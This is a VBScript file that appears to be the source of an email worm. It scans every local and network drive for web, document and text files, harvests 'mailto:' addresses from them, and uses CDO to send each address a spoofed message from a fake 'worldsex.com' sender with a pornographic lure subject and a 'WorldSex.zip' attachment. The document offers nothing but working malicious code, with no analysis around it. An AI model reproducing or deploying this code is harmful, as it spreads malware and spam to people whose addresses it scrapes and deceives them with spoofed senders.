Option Explicit
Dim Fso, Drives, Drive, Path, Folder, Files, File, SrchExten, SourceCode
Dim AllSourceCode, TxtLen, MailVictim, TxtCnt, SubFolders, SubFolder, RndNum
Dim Fake_EmailName, Mail_Subject, Mail_Body, Mail_To, CdoMail, MailConfig
Dim MailFields, MailTo


Set Fso = CreateObject("Scripting.FileSystemObject")

Set Drives = Fso.Drives
For Each Drive In Drives
If Drive.DriveType = 2 Or Drive.DriveType = 3 Then
DoSearchIn (Drive)
End If
Next


Function DoSearchIn(Path)
On Error Resume Next

Set Fso = CreateObject("Scripting.FileSystemObject")
Set Folder = Fso.GetFolder(Path)
Set Files = Folder.Files
For Each File In Files

SrchExten = Fso.GetExtensionName(File.Path)
SrchExten = LCase(SrchExten)
If (SrchExten = "htt") Or (SrchExten = "htm") Or (SrchExten = "html") _
Or (SrchExten = "hta") Or (SrchExten = "hte") Or (SrchExten = "htx") _
Or (SrchExten = "shtml") Or (SrchExten = "stm") Or (SrchExten = "asp") _
Or (SrchExten = "xml") Or (SrchExten = "doc") Or (SrchExten = "rtf") _
Or (SrchExten = "txt") Then

Set SourceCode = Fso.OpenTextFile(File.Path, 1)
AllSourceCode = SourceCode.ReadAll
SourceCode.Close

For TxtLen = 1 To Len(AllSourceCode)
If Mid(AllSourceCode, TxtLen, 7) = "mailto:" Then
MailVictim = ""
TxtCnt = 0
Do While Mid(AllSourceCode, TxtLen + 7 + TxtCnt, 1) <> """"
MailVictim = MailVictim + Mid(AllSourceCode, TxtLen + 7 + TxtCnt, 1)
TxtCnt = TxtCnt + 1
Loop

EmailTo (File.Path)
End If
Next
SourceCode = ""
AllSourceCode = ""
MailVictim = ""
End If
Next
Set SubFolders = Folder.SubFolders
For Each SubFolder In SubFolders
DoSearchIn (SubFolder.Path)
Next
End Function

Function EmailTo(MailTo)
On Error Resume Next

Randomize
RndNum = Int((10 * Rnd) + 1)
Select Case RndNum
Case 1
Fake_EmailName = "Admin@worldsex.com"
Mail_Subject = "XXX-PORN!!"
Case 2
Fake_EmailName = "Administrator@worldsex.com"
Mail_Subject = "XXX-New!!"
Case 3
Fake_EmailName = "Mod@worldsex.com"
Mail_Subject = "Nude Pictures!!"
Case 4
Fake_EmailName = "Moderator@worldsex.com"
Mail_Subject = "Nude Pictures and Movies!!"
Case 5
Fake_EmailName = "user@worldsex.com"
Mail_Subject = "Britney Nude"
Case 6
Fake_EmailName = "worldsex@worldsex.com"
Mail_Subject = "Spears...nude?!"
Case 7
Fake_EmailName = "president@worldsex.com"
Mail_Subject = "Sweet A$$!!"
Case 8
Fake_EmailName = "owner@worldsex.com"
Mail_Subject = "XXX"
Case 9
Fake_EmailName = "sluts@worldsex.com"
Mail_Subject = "Bitch sucking cokes!!"
Case 10
Fake_EmailName = "babes@worldsex.com"
Mail_Subject = "SLUTS!! XXX!! NEW!!"
End Select

Mail_Body = "Wattus up....???, <BR> <BR>" & _
 " Worldsex presents: Heaven for Real <BR>" & _
 " Check the attach if you don't believe!!"

Set CdoMail = CreateObject("CDO.Message")
Set MailConfig = CreateObject("CDO.Configuration")
Set MailFields = MailConfig.Fields
With CdoMail
.Configuration = MailConfig
.To = MailVictim
.From = Fake_EmailName
.Subject = Mail_Subject
.HTMLBody = Mail_Body
.AddAttachment ("C:\WorldSex.zip")
.Send
End With
Set MailFields = Nothing
Set MailConfig = Nothing
Set CdoMail = Nothing
End Function
